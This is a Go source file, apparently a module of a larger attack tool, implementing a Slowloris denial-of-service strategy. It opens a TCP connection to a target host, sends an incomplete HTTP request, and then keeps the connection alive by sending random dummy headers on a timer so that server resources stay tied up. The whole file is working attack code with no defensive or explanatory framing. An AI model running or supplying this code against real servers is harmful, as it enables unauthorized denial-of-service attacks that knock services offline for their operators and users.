package strategy

import (
	"context"
	"fmt"
	"math/rand"
	"net"
	"time"
)

type Slowloris struct {
	keepAliveInterval time.Duration
	connectionTimeout time.Duration
	initialHeaders    []string
}

func NewSlowloris(keepAliveInterval time.Duration) *Slowloris {
	return &Slowloris{
		keepAliveInterval: keepAliveInterval,
		connectionTimeout: 10 * time.Second,
		initialHeaders: []string{
			"GET / HTTP/1.1\r\n",
			"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n",
			"Accept-language: en-US,en;q=0.9\r\n",
		},
	}
}

func (s *Slowloris) Execute(ctx context.Context, target Target) error {
	host := extractHost(target.URL)
	if host == "" {
		return fmt.Errorf("invalid target URL: %s", target.URL)
	}

	dialer := &net.Dialer{
		Timeout: s.connectionTimeout,
	}

	conn, err := dialer.DialContext(ctx, "tcp", host)
	if err != nil {
		return fmt.Errorf("connection failed: %w", err)
	}
	defer conn.Close()

	for _, header := range s.initialHeaders {
		if _, err := conn.Write([]byte(header)); err != nil {
			return fmt.Errorf("failed to write initial header: %w", err)
		}
	}

	ticker := time.NewTicker(s.keepAliveInterval)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			return nil
		case <-ticker.C:
			dummyHeader := fmt.Sprintf("X-Random-%d: %d\r\n",
				rand.Intn(100000),
				time.Now().UnixNano())

			conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
			if _, err := conn.Write([]byte(dummyHeader)); err != nil {
				return fmt.Errorf("keep-alive failed: %w", err)
			}
		}
	}
}

func (s *Slowloris) Name() string {
	return "slowloris"
}

func extractHost(url string) string {
	if len(url) < 7 {
		return ""
	}

	start := 0
	if url[:7] == "http://" {
		start = 7
	} else if len(url) >= 8 && url[:8] == "https://" {
		start = 8
	}

	end := len(url)
	for i := start; i < len(url); i++ {
		if url[i] == '/' || url[i] == '?' {
			end = i
			break
		}
	}

	host := url[start:end]

	if len(host) > 0 && host[len(host)-1] != ':' {
		hasPort := false
		for i := len(host) - 1; i >= 0; i-- {
			if host[i] == ':' {
				hasPort = true
				break
			}
			if host[i] == '.' {
				break
			}
		}

		if !hasPort {
			if url[:7] == "http://" {
				host += ":80"
			} else {
				host += ":443"
			}
		}
	}

	return host
}
